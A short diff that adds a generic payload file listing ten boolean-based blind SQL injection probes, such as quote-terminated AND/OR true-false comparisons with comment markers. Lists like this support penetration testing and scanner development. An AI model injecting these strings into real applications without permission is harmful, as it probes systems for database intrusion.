@@ -1,0 +1,12 @@
+# Generic — Boolean Blind Payloads
+
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+1 AND 1=1--
+1 AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
